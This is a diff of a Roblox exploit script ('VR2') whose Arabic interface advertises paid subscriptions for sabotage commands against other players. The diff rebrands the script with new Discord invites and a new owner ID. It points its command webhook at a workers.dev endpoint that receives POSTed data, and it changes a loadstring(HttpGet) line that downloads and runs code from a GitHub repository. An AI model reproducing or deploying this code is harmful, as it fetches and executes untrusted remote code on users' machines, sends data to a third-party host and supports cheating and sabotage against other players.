@@ -4867,7 +4867,7 @@ if not _G.Opened then
 			textLabel.Font = Enum.Font.Gotham
 			textLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
 			textLabel.RichText = true
-			textLabel.Text = "ماهو اشتراك VR2؟\n\nهو اشتراك خاص بالسكربت يعطيك اولوية في السكربت.\n\nماذا تحصل عند الاشتراك؟\n• حماية من سكربت VR2 محد يقدر يفعل عليك\n• اوامر تخريب على الهاكات \n• دعم مباشر وسريع مع مطوري السكربت\n\nالاسعار:\n• اسبوعين : 40 ريال\n• شهر : 70 ريال\n• شهرين : 100 ريال\n• ثلاث اشهر : 140 ريال\n• سنة : 300 ريال\n\nللاشتراك تفضل سيرفر الدسكورد\nhttps://discord.gg/vr2\n"
+			textLabel.Text = "ماهو اشتراك VR2؟\n\nهو اشتراك خاص بالسكربت يعطيك اولوية في السكربت.\n\nماذا تحصل عند الاشتراك؟\n• حماية من سكربت VR2 محد يقدر يفعل عليك\n• اوامر تخريب على الهاكات \n• دعم مباشر وسريع مع مطوري السكربت\n\nالاسعار:\n• اسبوعين : 40 ريال\n• شهر : 70 ريال\n• شهرين : 100 ريال\n• ثلاث اشهر : 140 ريال\n• سنة : 300 ريال\n\nللاشتراك تفضل سيرفر الدسكورد\nhttps://discord.gg/Ghhpy4FPet\n"
 			textLabel.Parent = rightFrame
 
 			local checkButton = Instance.new("TextButton")
@@ -5512,7 +5512,7 @@ if not _G.Opened then
 			textLabel.Size = UDim2.new(1, -45, 1, 0)
 			textLabel.Position = UDim2.new(0, 45, 0, 0)
 			textLabel.BackgroundTransparency = 1
-			textLabel.Text = player.UserId == 951402104 and "7sone" or "VR2 OWNER"
+			textLabel.Text = player.UserId == 1990424117 and "StayHere" or "VR2 OWNER"
 			textLabel.TextScaled = true
 			textLabel.Font = Enum.Font.GothamBlack
 			textLabel.TextColor3 = textColor
@@ -5780,7 +5780,7 @@ if not _G.Opened then
 	end)
 
 	getgenv().Discord_Button.MouseButton1Click:Connect(function()
-		setclipboard("https://discord.gg/vr2")
+		setclipboard("https://discord.gg/Ghhpy4FPet")
 		SendNotify("System VR2", "تم نسخ رابط سيرفر الدسكورد", 5)
 	end)
 
@@ -9471,7 +9471,7 @@ if not _G.Opened then
 
 					spawn(function()
 						local vercelGet = loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Vercel-get"))()
-						local cmdhookUrl = "webhook" 
+						local cmdhookUrl = "https://oosoos.0dryfd.workers.dev/cmdhook"
 
 						getgenv().Cooldowner = false
 						getgenv().CommandLoopRunning = false
@@ -9743,7 +9743,7 @@ if not _G.Opened then
 
 											pcall(function()
 												request({
-													Url = "webhook",
+													Url = "https://oosoos.0dryfd.workers.dev/cmdhook",
 													Method = "POST",
 													Headers = { ["Content-Type"] = "application/json" },
 													Body = game:GetService("HttpService"):JSONEncode(webhookData)
@@ -9861,7 +9861,7 @@ if not _G.Opened then
 						},
 						Body = game:GetService("HttpService"):JSONEncode({
 							cmd = "INVITE_BROWSER",
-							args = { code = "4YtCepCRkN" },
+							args = { code = "Ghhpy4FPet" },
 							nonce = game:GetService("HttpService"):GenerateGUID()
 						})
 					})
@@ -9906,7 +9906,7 @@ if not _G.Opened then
 				return loadstring(game:HttpGet("https://raw.githubusercontent.com/Rive-Team/script.souce.code/refs/heads/main/sc"))()
 			end)
 			local success2, result2 = pcall(function()
-				return loadstring(game:HttpGet("https://raw.githubusercontent.com/VR2ss/OMK/refs/heads/main/Usernames"))()
+				return loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Usernames"))()
 			end)
 
 			if success1 then getgenv().p1 = result1 end
